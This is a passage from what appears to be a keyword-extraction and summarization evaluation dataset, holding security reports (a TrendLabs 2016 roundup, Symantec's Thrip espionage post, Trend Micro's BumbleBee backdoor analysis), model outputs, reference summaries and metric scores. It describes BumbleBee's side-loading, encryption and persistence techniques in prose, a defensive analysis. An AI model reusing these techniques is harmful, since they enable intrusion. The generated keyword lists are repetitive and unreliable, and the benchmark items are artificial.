\u201cRansomware Crooks Demand $70,000 After Hacking San Francisco Transport System \u2013 UPDATED.\u201d Last accessed on 17 January 2017, url san-francisco-muni-hacked-ransomware/#5f51e76f54dd4. Kat Hall. (29 September 2016). The Register. \u201cVESK Coughs Up \u00a318k in Ransomware Attack.\u201d Last accessed on 17 January 2017,url Davis. (5 October 2016). Healthcare IT News. \u201cTwo Providers Forced to Pay Up in Ransomware Attacks.\u201d Last accessed on 17 January 2017, url Francis Antazo, Byron Gelera, Jeanne Jocson, Ardin Maglalang, and Mary Yambao. (25 August 2016). TrendLabs Security Intelligence Blog.\u201cNew Open Source Ransomware Based on Hidden Tear and EDA2 May Target Businesses.\u201d Last accessed on 17 January 2017, url tear-and-eda2-may-target-businesses/7. Trend Micro. (7 September 2016). Trend Micro Security News.\u201cRansomware as a Service Offered in the Deep Web: What This Means for Enterprises.\u201d Last accessed on 17 January 2017, url digital-threats/ransomware-as-a-service-what-this-means-for-enterprises8. Trend Micro. (9 June 2016). Trend Micro Security News.\u201cBillion-Dollar Scams: The Numbers Behind Business Email Compromise.\u201d Last accessed on 17 January 2017, url dollar-scams-the-numbers-behind-business-email-compromise9.Leoni AG. (16 August 2016). Leoni. \u201cLeoni Targeted by Criminals.\u201d Last accessed on 17 January 2017, url press/releases/details/leoni-targeted-by-criminals/10. Trend Micro. (25 August 2016). Trend Micro Security News.\u201cBrisbane Council Loses 450K AUD to BEC Scam.\u201d Last accessed on 17 January 2017, url 450k-aud-to-bec-scam11. Trend Micro. (21 September 2016). Trend Micro Security News.\u201c$6M Lost in Another BEC Scam: Who Is the Weakest Link?.\u201d Last accessed on 17 January 2017, url in-another-bec-scam-who-is-the-weakest-link12. Ryan Flores. (23 November 2016). TrendLabs Security Intelligence Blog.\u201cCEO Fraud Email Scams Target Healthcare Institutions.\u201d Last accessed on 17 January 2017, url healthcare-institutions/13. DL Cade. (17 August 2017). PetaPixel. \u201cAll the Major Browsers Will Soon Block Flash, is Your Website Ready?.\u201d Last accessed 18January 2017, url Jonathan Leopando. (27 October 2016). TrendLabs Security Intelligence Blog. \u201cPatch Your Flash: Another Zero-Day Vulnerability Hits Adobe Flash.\u201d Last accessed on 17 January 2017, url another-zero-day-vulnerability-hits-adobe-flash/37 | TrendLabs 2016 Security Roundup: A Record Year for Enterprise Threats15. Feike Hacquebord and Stephen Hilt. (9 November 2016). TrendLabs Security Intelligence Blog.\u201cPawn Storm Ramps Up Spear- phishing Before Zero-Days Get Patched.\u201d Last accessed on 17 January 2017, url intelligence/pawn-storm-ramps-up-spear-phishing-before-zero-days-get-patched/16. Brian Krebs. (11 October 2016). Krebs on Security. \u201cMicrosoft: No More Pick-and-Choose Patching.\u201d Last accessed 17 January2017, url Trend Micro. (31 October 2016). TrendLabs Security Intelligence Blog. \u201cMasque Attack Abuses iOS\u2019s Code Signing to Spoof Apps and Bypass Privacy Protection.\u201d Last accessed on 17 January 2017, url ios-masque-attack-spoof-apps-bypass-privacy-protection/18. Trend Micro. (6 October 201). Trend Micro Security News. \u201cFirst Malware-Driven Power Outage Reported in Ukraine.\u201d Last accessed on 1 February 2017, url outage-reported-in-ukraine19. Echo Duan. (29 September 2016). TrendLabs Security Intelligence Blog.\u201cDressCode and its Potential Impact for Enterprises.\u201d Last accessed on 17 January 2017, url enterprises/20. Dan Goodin. (10 December 2014). arsTechnica. \u201cPoC Hack on Data Sent Between Phones and Smartwatches (Updated).\u201d Last accessed on 23 January 2017, url open-to-brute-force-hacks/21. Darren Pauli. (10 November 2016). The Register. \u201cIoT Worm Can Hack Philips Hue Lightbulbs, Spread Across Cities.\u201d Last accessed on 23 January 2017, url across_cities/22. Kyle York. (22 October 2016). Dyn. \u201cDyn Statement on 10/21/2016 DDoS Attack.\u201d Last accessed on 23 January 2017, url David Bisson. (27 October 2016). Tripwire. \u201c100,000 Bots Infected with Mirai Malware Behind Dyn DDoS Attack.\u201d Last accessed on 18 January 2017, url caused-dyn-ddos-attack/24. Echo Duan. (13 June 2016). TrendLabs Security Intelligence Blog. \u201cFLocker Mobile Ransomware Crosses to Smart TV.\u201d Last accessed on 23 January 2017, url Janita. (7 November 2016). Metropolitan.fi. \u201cDDoS Attack Halts Heating in Finland Amidst Winter.\u201d Last accessed on 23 January2017, url WXYZ. (18 November 2016). WXYZ. \u201cMichigan State University Confirms Data Breach of Server Containing 400,000 Student, Staff Records.\u201d Last accessed on 18 January 2017, url server-containing-400000-student-staff-records27. Bob Young. (21 December 2016). The Seattle Times. \u201cData Breach Exposes Info for 400,000 Community Health Plan Members.\u201d Last accessed on 18 January 2017, url community-health-plan-members/28. Trend Micro. (15 December 2016). Trend Micro Security News.\u201cYahoo Discloses 2013 Breach that Exposed Over One Billion Accounts.\u201d Last accessed on 18 January 2017, url discloses-2013-breach-exposed-over-1billion-accounts29. Mathew Schwartz (20 January 2017). Information Security Media Group, Corp. \u201cReport: US Data Breaches Reach Record Levels.\u201d Last accessed on 6 February 2017, url Andrew Osborn. (1 June 2016). Reuters. \u201cRussia Says Arrests Hacker Gang Who Defrauded Banks of Millions.\u201d Last accessed on18 January 2017, url | TrendLabs 2016 Security Roundup: A Record Year for Enterprise Threats31. Kawabata Kohei. (20 July 2016). TrendLabs Security Intelligence Blog. \u201cCrypMIC Ransomware Wants to Follow CryptXXX\u2019s Footsteps.\u201d Last accessed on 18 January 2017, url wants-to-follow-cryptxxx/32. Kafeine. (2 October 2016). Malware Don\u2019t Need Coffee. \u201cRIG Evolves, Neutrino Waves Goodbye, Empire Pack Appears.\u201d Lastaccessed on 18 January 2017, url Trend Micro. (18 October 2016). Trend Micro Security News. \u201cRansomware Recap: Oct. 14, 2016.\u201d Last accessed on 18 January2017, url Trend Micro. (4 October 2016). Trend Micro Security News. \u201cRansomware Recap: Sept. 30, 2016.\u201d Last accessed on January 18,2017, url Kawabata Kohei, Joseph C. Chen, and Jeanne Jocson. (9 September 2016). TrendLabs Security Intelligence Blog. \u201cPicture Perfect: CryLocker Ransomware Uploads User Information as PNG Files.\u201d Last accessed on 18 January 2017, url com/trendlabs-security-intelligence/picture-perfect-crylocker-ransomware-sends-user-information-as-png-files/36. Brooks Li and Joseph C. Chen. (4 November 2016). TrendLabs Security Intelligence Blog. \u201cNew Bizarro Sundown Exploit Kit Spreads Locky.\u201d Last accessed on 18 January 2017, url sundown-exploit-kit-spreads-locky/37. Brooks Li and Joseph C. Chen. (29 December 2016). TrendLabs Security Intelligence Blog. \u201cUpdated Sundown Exploit Kit Uses Steganography.\u201d Last accessed on 18 January 2017, url sundown-exploit-kit-uses-steganography/38. Joseph C. Chen (12 October 2016). TrendLabs Security Intelligence Blog. \u201cSeveral Exploit Kits Now Deliver Cerber 4.0.\u201d Last accessed on 18 January 2017, url cerber-4-0/39. Trend Micro. (20 May 2016). Trend Micro Security News. \u201cSkimer ATM Malware Gets Updated, Turns ATMs into Skimming Machines.\u201d Last accessed on 19 January 2017, url threats/skimer-atm-malware-updated-turns-atm-into-skimmer40. David Sancho and Numaan Huq. (12 April 2016). TrendLabs Security Intelligence Blog. \u201cATM Malware on the Rise.\u201d Last accessedon 19 January 2017, url Dave Massy. (17 February 2014). Microsoft Developer Network. \u201cWhat Does the End of Support of Windows XP Mean for Windows Embedded?\u201d Last accessed on 23 February 2017 on, url does-the-end-of-support-of-windows-xp-mean-for-windows-embedded/42. David Sancho and Numaan Huq. (20 December 2016). TrendLabs Security Intelligence Blog. \u201cAlice: A Lightweight, Compact, No-Nonsense ATM Malware.\u201d Last accessed on 19 January 2017, url alice-lightweight-compact-no-nonsense-atm-malware/43. Cklaudioney Mesa and Christopher Ordonez. (18 February 2016). TrendLabs Security Intelligence Blog. \u201cQAKBOT Resurges: Despite Takedowns, Online Banking Threats Persist.\u201d Last accessed on 19 January 2017, url security-intelligence/despite-arrests-and-takedowns-online-banking-threats-persist/44. SecurityWeek. (27 August 2016). SecurityWeek. \u201cRamnit Banking Trojan Resumes Activity.\u201d Last accessed on 19 January 2017,url Brian Prince. (25 January 2015). SecurityWeek. \u201cRamnit Botnet Brought Down in Joint Operation by Police, Security Researchers.\u201d Last accessed on 19 January 2017, url researchers46. Limor Kessem. (26 August 2016). SecurityIntelligence. \u201cRamnit Rears Its Ugly Head Again, Targets Major UK Banks.\u201d Lastaccessed on 19 January 2017, url Kayla Thrailkill. (13 September 2016). PC Pitstop TechTalk. \u201cUniversity Gastroenterology Informs Patients of Data SecurityIncident.\u201d Last accessed on 20 February 2017, url | TrendLabs 2016 Security Roundup: A Record Year for Enterprise Threats48.Ian Richardson. (2 August 2016). Sioux City Journal. \u201cSupervisors Approve investigation into Cyber Attack that Compromised 3,700 County Files.\u201d Last accessed on 17 January 2017, url into-cyber-attack-that-compromised-county-files/article_6273cb18-7704-5803-bd66-c88a9931a4d0.html49. Kaitlyn Schwers. (16 November, 2016). Belleville News-Democrat. \u201cUnionized Grocery Workers May be Victimized by ComputerHack.\u201d Last accessed on February 20 2017, url Jessica Davis. (5 October, 2016). Healthcare IT News. \u201cTwo Providers Forced to Pay Up in Ransomware Attacks.\u201d Last accessedon 20 February 2017, url Akanksha Jayanthi. (4 October, 2016). Beckers\u2019 Hospital Review. \u201cNew Jersey Spine Center Pays Ransom to Cyberattackers After \u2018Seeing No Other Option\u2019.\u201d Last accessed on 20 February 2017, url technology/new-jersey-spine-center-pays-ransom-to-cyberattackers-after-seeing-no-other-option.html52. Bobeth Yates. (20 August 2016). ABC 7 MySuncoast. \u201cCity of Sarasota\u2019s System Hacked by Ransomware, Data Held Hostage.\u201d Last accessed on 17 January 2017, url data-held/article_706019e2-6635-11e6-94cc-af3af2bb01f1.html53. Daniel Tyson. (27 August 2016). TheRegister-Herald.com. \u201cARH Bomputers Breached.\u201d Last accessed on 17 January 2017, url Kobe University. (7 September 2016). Kobe University. \u201cOn the Computer Virus Infection of Our Professional Computer.\u201d Lastaccessed on 17 January 2017, url Amy Dalrymple. (12 September 2016). Grand Forks Herald. \u201cND Department Attacked by Ransomware.\u201d Last accessed on 17January 2017, url Monica Vaughan. (12 September 2016). Appeal Democrat. \u201cRansomware Attack Hits Yuba City Clinic.\u201d Last accessed on 17 January 2017, url 8506-5f7d1b5d1d53.html57. Nicole Young. (20 September 2016). The Tennessean. \u201cSpringfield City Hall Recovers From Ransomware Attack.\u201d Last accessed on 17 January 2017, url ransomware-attack/90746176/58. Rodney Hanners. (20 September 2016). Keck Medicine. \u201cNotice of Data Breach.\u201d Last accessed on 17 January 2017, url KRGV. (22 September 2016). KRGV.com. \u201cPalmhurst Police Department Avoids Data Loss.\u201d Last accessed on 17 January 2017,url Jessica Davis. (4 October 2016). Healthcare IT News. \u201cRansomware Attack on Urgent Care Clinic of Oxford, Purportedly Causedby Russian Hackers.\u201d Last accessed on 17 January 2017, url Dissent. (17 October 2016). DataBreaches.net. \u201cRainbow Children\u2019s Clinic Notifies 33,368 Patients of Ransomware Attack.\u201d Last accessed on 17 January 2017, url attack/62. Abe Hawken. (31 October 2016). Daily Mail. \u201cNHS Trust Cancels EVERY Operation at Three Hospitals After its Electronic System Was Hit by a Computer Virus Attack.\u201d Last accessed on 17 January 2017, url Trust-cancels-operation-three-hospitals-electronic-hit-computer-virus-attack.html63. Lynn Brezosky. (11 November 2016). San Antonio Express-News. \u201cRansomware Attack Targets Seguin Dermatology Practice.\u201d Last accessed on 17 January 2017, url dermatology-10609268.php64. Brittany Seemuth. (10 November 2016). Northwest Now. \u201cCyber Ransoming Hits Menomonee Falls Businesses.\u201d Last accessed on 17 January 2017, url menomonee-falls-businesses/93548816/40 | TrendLabs 2016 Security Roundup: A Record Year for Enterprise Threats65. Herald Bulletin. (15 November 2016). Indiana Economic Digest. \u201cEDITORIAL: Madison County Hacker Attack Will Cost More Than Ransom Payment.\u201d Last accessed on 17 January 2017, url ID=201&articleID=8594966. Kayla Thrailkill. (18 Novemeber 2016). PC Pitstop Tech Talk. \u201cSpencer Chamber of Commerce Infected With Ransomware.\u201d Lastaccessed on 17 January 2017, url Associated Press. (24 November 2016). Billings Gazette. \u201cRansomware Attack on Bigfork Schools; Fix in Works.\u201d Last accessed on 17 January 2017, url works/article_7ff38855-e5a1-59d8-84de-18869e1c0df6.html68. Devin Zimmerman. (29 November 2016). kokomoperspective. \u201cRansomware Targets Howard County Government.\u201d Last accessed on 17 January 2017, url article_9a6d8640-b5bb-11e6-854b-ff832671083f.html69. Matthew Braga. (29 November 2016). CBC News. \u201cCarleton University Computers Infected with Ransomware.\u201d Last accessed on 17 January 2017, url Erin Allen. (8 December 2016). PC Pitstop Tech Talk. \u201cHenry County Hit with Ransomware, Leaving 18,000 Voters as Victims.\u201d Last accessed on 17 January 2017, url victims/71. Erin Allen. (14 December 2016). PC Pitstop Tech Talk. \u201cRansomware Strikes Arkansas Sheriff\u2019s Office.\u201d Last accessed on 17January 2017, url Joseph Goedert. (22 December 2016). Information Management. \u201cCalifornia Health Center Ransomware Attack Affects 65,000.\u201d Last accessed on 17 January 2017, url ransomware-attack-affects-65000-10030545-1.html41 | TrendLabs 2016 Security Roundup: A Record Year for Enterprise Threats ", "generated_text": "2016; cybercriminals; 1 billion; losses; 200; 247; new ransomware families; 247; over 200; Business Email Compromise; BEC; 2014; 1 billion; moderate losses; AV; monitoring; control; SQL; RAT; remote access; Exchange; DB; systems; Passwords; the ransom; Windows; Android; iOS; Bitcoin; a backdoor; a user; data; bank accounts; data requests; the Ransomware; Bank treasury; Antenna; execution; Internet Explorer; Windows 7; RAT; Monitoring; Messages; IDs; email addresses; the report; efforts; Scanner; malware; data loss; data integrity checks; a phishing email; espionage; espionage; phishing emails; data theft; social engineering; security; banks; banking threats; IoT; banking Trojans; ATM Malware; Systems; an array; threat actors; the world; EXE; bank hackers; the scope; infrastructure.", "ref_text": "<START-1>Ransomware spiked dramatically in 2016, with over 200 new families detected - a 752% increase from 2015. Many targeted business files like databases, servers, and virtual desktops. Open source ransomware and Ransomware-as-a-Service fueled growth. Business Email Compromise (BEC) scams caused major losses across 92 countries. Scams impersonating executives ramped up late in the year, targeting healthcare and other sectors. Vulnerabilities discovered in 2016 exceeded 700, a new record high. Adobe Reader and Advantech's WebAccess had the most. Flash vulnerabilities declined as it is phased out. The Mirai botnet highlighted risks of insecure IoT devices. It hijacked over 100,000 devices to launch massive DDoS attacks, disrupting major sites. The Yahoo breach exposed over 1 billion accounts, emphasizing issues of responsible disclosure and securing user data. Exploit kits declined after law enforcement actions, but new kits emerged. Angler disappeared while Neutrino and Rig distributed ransomware. Banking trojans and ATM malware persisted, evolving to target financial sectors. Old malware like RAMNIT resurfaced to attack banks. In total, over 80 billion threats were blocked in 2016, a 56% increase from 2015, indicating an expanding threat landscape. Email threats grew significantly. In summary, the report highlights key trends of ransomware growth, financial malware, vulnerabilities, data breaches, and an expanding threat landscape that demands improved security. <END-1>", "t5/keyword/hint_hit_precision": 0.19718309859154928, "t5/word/hint_hit_recall": 0.1, "gpt3/lexical/rouge_rouge1": 0.4228571428571428, "gpt3/lexical/rouge_rouge2": 0.132183908045977, "gpt3/lexical/rouge_rougeL": 0.2171428571428571, "gpt3/lexical/rouge_rougeLsum": 0.2171428571428571, "gpt3_generated_text": ["The TrendLabs 2016 Security Roundup highlights the significant rise in cybersecurity threats faced by enterprises in 2016. Ransomware saw a staggering 752% increase in new families, resulting in over 200 families causing billions of dollars in losses worldwide. Business Email Compromise (BEC) scams also generated substantial profits for cybercriminals through social engineering tactics. Vulnerabilities in widely used platforms like Adobe Acrobat Reader DC and Advantech\u2019s WebAccess raised concerns, while the Mirai botnet's massive DDoS attack underscored IoT security issues. The year also witnessed the biggest data breach in history, exposing weaknesses in companies' data handling practices. Banking threats continued to evolve with the development of banking Trojans and ATM malware. The roundup serves as a guide for enterprises to understand the evolving threat landscape and adopt effective security strategies to protect against cyber threats."]}, {"split_name": "val", "sample_id": "val_106", "prompt_text": "Extract the keywords: BlogsMenu\uf002Save web pages as PDF with PDFmyURLPO STED : MI NR EADTHR EAT I NTEL L I G ENCE\uf0e0 SUBSCRIBEFOLLOW\uf099 \uf09a \uf08cResponse AttackInvestigationSecurityTeam\uf099\uf08c\uf09aE SOne of the most significant developments in cyber espionage in recent years has been the number of groups adopting \u201cliving off the land\u201d tactics. That\u2019s our shorthand for the use of operating system features or legitimate network administration tools to compromise victims\u2019 networks. The purpose of living off the land is twofold. By using such features and tools, attackers are hoping to blend in on the victim\u2019s network and hide their activity in a sea of legitimate processes. Secondly, even if malicious activity involving these tools is detected, it can make it harder to attribute attacks. If everyone is using similar tools, it\u2019s more difficult to distinguish one group from another. Most attack groups do still create and leverage custom malware, but it tends to be employed sparingly, reducing the risk of discovery.Save web pages as PDF with PDFmyURLFinding the needle in the haystackThis doesn\u2019t mean espionage attacks are now going undiscovered, but it does mean that they can take longer for analysts to investigate. This is one of the reasons why Symantec created Targeted Attack Analytics (TAA), which takes tools and capabilities that we\u2019ve developed for our own analysts and makes them available to our Advanced Threat Protection (ATP) customers. TAA leverages advanced artificial intelligence and machine learning that combs through Symantec\u2019s data lake of telemetry in order to spot patterns associated with targeted attacks. Its advanced AI automates what previously would have taken thousands of hours of analyst time. This makes it far easier for us, and for our customers, to find that needle in the haystack.It was TAA that led us to the latest cyber espionage campaign we\u2019ve uncovered. Back in January 2018, TAA triggered an alert at a large telecoms operator in Southeast Asia. An attacker was using PsExec to move laterally between computers on the company\u2019s network. PsExec is a Microsoft Sysinternals tool for executing processes on other systems and is one of the most frequently seen legitimate pieces of software used by attackers attempting to live off the land. However, it\u2019s also widely used for legitimate purposes, meaning malicious use of PsExec can be difficult to spot.TAA not only flagged this malicious use of PsExec, it also told us what the attackers wereSave web pages as PDF with PDFmyURLusing it for. They were attempting to remotely install a previously unknown piece of malware on computers within the victim\u2019s network. When we analyzed the malware, we discovered that it was an updated version of Trojan.Rikamanu, malware associated with Thrip, a group we\u2019ve been monitoring since 2013. After further investigation, we discovered that Thrip also used a completely new piece of malware in this attack (Infostealer.Catchamas).Figure 1. Targeted Attack Analytics leverages machine learning to spot malicious activity associated with targeted attacks and alerts the customer.Armed with this information about the malware and living off the land tactics being used against this victim, we broadened our search to see if we could find similar patterns that indicated Thrip had been targeting other organizations. We uncovered a wide-ranging cyber espionage campaign involving powerful malware being used against targets that are aSave web pages as PDF with PDFmyURLcause for concern.We identified three computers in China being used to launch the Thrip attacks. Thrip\u2019s motive is likely espionage and its targets include those in the communications, geospatial imaging, and defense sectors, both in the United States and Southeast Asia.Eye on the sky: Thrip\u2019s targetsPerhaps the most worrying discovery we made was that Thrip had targeted a satellite communications operator. The attack group seemed to be particularly interested in the operational side of the company, looking for and infecting computers running software that monitors and controls satellites. This suggests to us that Thrip\u2019s motives go beyond spying and may also include disruption.Another target was an organization involved in geospatial imaging and mapping. Again, Thrip seemed to be mainly interested in the operational side of the company. It targeted computers running MapXtreme GIS (Geographic Information System) software which is used for tasks such as developing custom geospatial applications or integrating location- based data into other applications. It also targeted machines running Google Earth Server and Garmin imaging software.The satellite operator wasn\u2019t the only communications target Thrip was interested in. TheSave web pages as PDF with PDFmyURLgroup had also targeted three different telecoms operators, all based in Southeast Asia. In all cases, based on the nature of the computers infected by Thrip, it appeared that the telecoms companies themselves and not their customers were the targets of these attacks.In addition, there was a fourth target of interest, a defense contractor.Save web pages as PDF with PDFmyURLFigure 2. Thrip, spying on communications, mapping, and defense targetsAttempting to hide in plain sightWe\u2019ve been monitoring Thrip since 2013 when we uncovered a spying campaign being orchestrated from systems based in China. Since our initial discovery, the group has changed its tactics and broadened the range of tools it used. Initially, it relied heavily on custom malware, but in this most recent wave of attacks, which began in 2017, the group has switched to a mixture of custom malware and living off the land tools. The latter include:Save web pages as PDF with PDFmyURLPsExec: Microsoft Sysinternals tool for executing processes on other systems. The tool was primarily used by the attackers to move laterally on the victim\u2019s network. PowerShell: Microsoft scripting tool that was used to run commands to download payloads, traverse compromised networks, and carry out reconnaissance. Mimikatz: Freely available tool capable of changing privileges, exporting security certificates, and recovering Windows passwords in plaintext. WinSCP: Open source FTP client used to exfiltrate data from targeted organizations. LogMeIn: Cloud-based remote access software. It\u2019s unclear whether the attackers gained unauthorized access to the victim\u2019s LogMeIn accounts or whether they created their own.All of these tools, with the exception of Mimikatz (which is almost always used maliciously), have legitimate uses. For example, PowerShell is widely used within enterprises and the vast majority of scripts are legitimate. Similarly, PsExec is frequently used by systems administrators. However, in this case, it was Thrip\u2019s use of PsExec that drew our attention. Through advanced artificial intelligence and machine learning, TAA has trained itself to spot patterns of malicious activity. While PsExec itself may be innocuous, the way that it was being used here triggered an alert by TAA. In short, Thrip\u2019s attempts at camouflage blew its cover.While Thrip now makes heavy use of living off the land tactics, it also employs customSave web pages as PDF with PDFmyURLmalware, particularly against computers of interest. This includes:Trojan.Rikamanu: A custom Trojan designed to steal information from an infected computer, including credentials and system information. Infostealer.Catchamas: Based on Rikamanu, this malware contains additional features designed to avoid detection. It also includes a number of new capabilities, such as the ability to capture information from newer applications (such as new or updated web browsers) that have emerged since the original Trojan.Rikamanu malware was created. Trojan.Mycicil: A keylogger known to be created by underground Chinese hackers. Although publicly available, it is not frequently seen. Backdoor.Spedear: Although not seen in this recent wave of attacks, Spedear is a backdoor Trojan that has been used by Thrip in other campaigns. Trojan.Syndicasec: Another Trojan used by Thrip in previous campaigns.Highly targeted espionage operationFrom the initial alert triggered by TAA, we were able to follow a trail that eventually enabled us to see the bigger picture of a cyber espionage campaign originating from computers within China and targeting multiple organizations in the U.S. and Southeast Asia. Espionage is the group\u2019s likely motive but given its interest in compromising operational systems, it could also adopt a more aggressive, disruptive stance should it choose to do so.Save web pages as PDF with PDFmyURLProtectionSymantec has had protection from Thrip since 2013 and we secure our customers from the attack group\u2019s latest set of malicious tools. The following protections are in place to protect customers against Thrip attacks:File-based protectionTrojan.Rikamanu Trojan.SyndicasecNetwork Protection ProductsMalware Analysis Appliance detects activity associated with Thrip Customers with Webpulse-enabled products are protected against activity associated with ThripThreat IntelligenceSave web pages as PDF with PDFmyURLIn addition to file-based protection, customers of the DeepSight Intelligence Managed Adversary and Threat Intelligence (MATI) service have received multiple reports on Thrip (codenamed ATG14) which detail methods of detecting and thwarting activities of this group.File Attachments\uf019Thrip IOC listTXT 10.14 KBFurther readingTo find out more about Targeted Attack Analytics (TAA), read our whitepaper Targeted Attack Analytics: Using Cloud-based Artificial Intelligence for Enterprise-Focused Advanced Threat ProtectionAbout the Author Security Response Attack Investigation Team The Attack Investigation Team is a group of security experts within Symantec SecuritySave web pages as PDF with PDFmyURLResponse whose mission is to investigate targeted attacks, drive enhanced protection in Symantec products, and offer analysis which helps customers respond to attacks.\uf1e0Want to comment on this post?We encourage you to share your thoughts on your favorite social platform.\uf099 \uf08c \uf09a\uf14e Related Blog PostsPOSTED: MINREADPOSTED: MINREADPOSTED: MINREADPOSTED: MINSave web pages as PDF with PDFmyURLREAD\uf0e0 SUBSCRIBEFOLLOW\uf099 \uf09a \uf08cContact Us Terms of Use Privacy & Cookies \u00a9Save web pages as PDF with PDFmyURL ", "generated_text": "The document; targets; espionage campaigns; TAA; use; operating system features; legitimate network administration tools; victims\u2019 networks; the purpose; living off the land; malware; Trojan; Rikamanu; malware; Thrip; 2013; cyber espionage; a satellite communications operator; geospatial imaging; mapping; the US; the US; Southeast Asia; the malware; malware; tools; malware; attacks; patterns; C2; targets; the land.", "ref_text": "<START-1>The post discusses the cyberespionage group Thrip and their tactics, techniques, and procedures. Thrip has been active since 2013 and originates from China. Recently, Thrip has shifted tactics to \"living off the land\", meaning using built-in OS features and legitimate tools to conduct attacks and blend in. Symantec uncovered a new campaign by Thrip starting in January 2018 when their Targeted Attack Analytics technology detected suspicious lateral movement using PsExec on a telecom's network in Southeast Asia. Further investigation revealed new malware tools Catchamas and an updated Rikamanu being distributed. Thrip targeted several concerning sectors including satellite communications, geospatial imaging, telecoms, and defense contractors in the US and Southeast Asia. Their interest in operational systems suggests potential motives beyond spying like disrupting satellites. In addition to living off the land tools like PowerShell and Mimikatz, Thrip deploys custom malware against high-value targets including the remote access tools Rikamanu and Catchamas. Symantec has protections against Thrip's activities and new malware tools. The post highlights how targeted attackers are increasingly living off the land, making detection challenging and requiring advanced analytics. It also underscores supply chain concerns with a China-based group compromising satellite operations. <END-1>", "t5/keyword/hint_hit_precision": 0.34375, "t5/word/hint_hit_recall": 0.08854166666666667, "gpt3/lexical/rouge_rouge1": 0.47249190938511326, "gpt3/lexical/rouge_rouge2": 0.1758957654723127, "gpt3/lexical/rouge_rougeL": 0.2718446601941748, "gpt3/lexical/rouge_rougeLsum": 0.2718446601941748, "gpt3_generated_text": ["The article discusses the rise of cyber espionage groups using \"living off the land\" tactics, utilizing operating system features and legitimate network administration tools to compromise victims' networks. Symantec's Targeted Attack Analytics (TAA) helps identify patterns associated with targeted attacks, leading to the discovery of a cyber espionage campaign by Thrip targeting organizations in the communications, geospatial imaging, and defense sectors in the US and Southeast Asia. Thrip's use of malware such as Trojan.Rikamanu and Infostealer.Catchamas, as well as tools like PsExec, indicates a sophisticated and persistent threat. Of particular concern is Thrip's targeting of a satellite communications operator, suggesting motives beyond espionage to potentially include disruption."]}, {"split_name": "val", "sample_id": "val_107", "prompt_text": "Extract the keywords: www.trendmicro.com /en_hk/research/22/i/buzzing-in-the-background-bumblebee-a-new-modular-backdoor-evolv.html Buzzing in the Background: BumbleBee, a New Modular Backdoor Evolved From BookWorm \u22ee 9/2/2022Updated on Sept. 2, 2022, at 9:55 p.m. ET to clarify the difference between this Bumblebee malware and the Bumblebee ransomware loader.IntroductionIn March 2021, we investigated a backdoor with a unique modular architecture and called it BumbleBee due to a string embedded in the malware. Its type of modular framework has made our static analysis more challenging because it required us to first rebuild its structure or use dynamic analysis to understand its functionality and behavior.Our analysis found that BumbleBee only had little malicious code in its payload, and what it does on the surface is track keys and clipboard content. However, further investigation revealed a controller application that expands the malware\u2019s capabilities.This type of backdoor is similar to another of its kind called BookWorm, in which it can be inferred that BumbleBee is a refactored version of BookWorm. At the time of writing, BumbleBee has only been deployed in Taiwan; together with its use of Simplified Chinese as the language for its user interface, this malware can be suspected to be deployed by malicious Chinese actors. This blog will tackle BumbleBee\u2019s capabilities and our analysis of this backdoor. It's important to note that this Bumblebee malware family is different from the Bumblebee loader, a loader malware that is used by ransomware groups to drop backdoors to gain access to corporate networks.BumbleBee \u2013 a refactored modular backdoorBumbleBee is a modular backdoor that comprises two applications, a server and a client application (a master and slaver application, respectively in the malware\u2019s jargon). Once the client application is deployed on the target computer (these are commonly local government devices), threat actors can control the machine using the server module. Let us take a deeper look into this backdoor.Layered deployment \u2013 client applicationWe have encountered the client application in a security breach incident. Its unique \u201clayer-in-layer\u201d architecture caught our attention. The module has a self-extracted file that contains three main parts: a legitimate executable (XcrSvr.exe), side-loaded DLL (XecureIO_v20.dll) and the shellcode binary file (ore) in the file system to execute the legitimate executable.Figure 1. Architecture of BumbleBee1/6Figure 2. Metadata of XcrSvr.exeXCrSvr.exe is the executable in the XecureVistaCryptoSvr module developed by SoftForum. This file is exploited to launch the side-loaded DLL, XecureIO_v20.dll, which will work as the next-stage loader that executes the shellcode \u201core,\u201d which is the main component in this backdoor. This shellcode contains multiple modules of its own (shown in Table 1). Each module has corresponding 32-bit and 64-bit versions of binaries in the shellcode except for launcher.dll.DescriptionName launcher.dll The first-stage launcher that loads all the subsequent modules. It decrypts a list of modules in kernel.dll installer.dll The module used to install components in the compromised machine.memory and executes each in order. The utility component that controls all the other modules.keylog.dllloader.dll slaver.dllThe keylog component monitors the keystrokes and clipboard content of the victim, and records actions from the victim such as running a process, entering a password, and getting the text of a window. The stolen data will then be run through a XOR logic gate with a two-byte key 0xF29D and saved under %temp%\\kb\\[UserName]\\. The timestamp will be used as the file name. The module that reads the shellcode. The main module that interacts with the other methods once the backdoor is launched.Table 1. BumbleBee's modulesIf a victim is compromised for the first time, launcher.dll loads and launches all the other modules. The installer modules will be responsible for the installation and establishing persistence on the compromised machine via the following steps:1. Drop a copy of the XecureIO_v20.dll in %APPDATA%\\LOCAL\\TEMP folder. 2. Encrypt original shellcode file (to be a \u201cbin\u201d file) and path information (to be a \u201cpath\u201d file) by using RC4 algorithm(key is the value of \u201cProductID\u201d from \u201cHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Internet Explorer\\Registration\u201d)3. Drop bpu.dll (used to bypass UAC) and launched by rundll32.exe. 4. Establish persistence on compromised machine. 5. Delete the original SFX file.Notably, as XecureIO_v20.dll is loaded by XcrSvr.exe, it will check if the parent process is \u201cXcrSvr.exe.\u201d If so, it will patch the entry point of XcrSvr.exe with a long jump instruction to direct execution flow to the malicious code.2/6Figure 3. XecureIO_v20.dll hooks its parent process\u2019 entry pointFigure 4. The original entry pointFigure 5. The patched entry pointBased on our analysis, we think the reason is that the malicious code embedded in XecureIO_v20 will not run if it followed the normal execution flow of XCrSvr.exe. Hence, once XecureIO_v20.dll is loaded by XCrSvr.exe, it will patch the entry point of XCrSvr.exe and jump to the address of the malicious code to make sure the code can be executed properly. After the client is installed and the persistence is established, the loader, XecureIO_v20.dll, will retrieve the value of \u201cProductID\u201d from the registry key \u201cHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Internet Explorer\\Registration\u201d and use it as the key to decrypt the encrypted payload (the file \u201cbin\u201d) dropped in the first installation. Using the information on the compromised machine as a key to encrypt the payload makes it much more difficult for analysts to decrypt and debug the malware in the analysis environment.File name Description path An RC4-encrypted path string used to find the location of next-stage shellcode. It could be a file path binor a registry path starting with HKLM or HKCU. The next-stage RC4-encrypted shellcode payload.Table 2. Payload file namesExpanded control \u2013 server application Due to BumbleBee\u2019s complex client application, it took some time for us to fully analyze its functionality. While doing so, we ran across the server application of the malware that acts as a controller. This provided us with further understanding 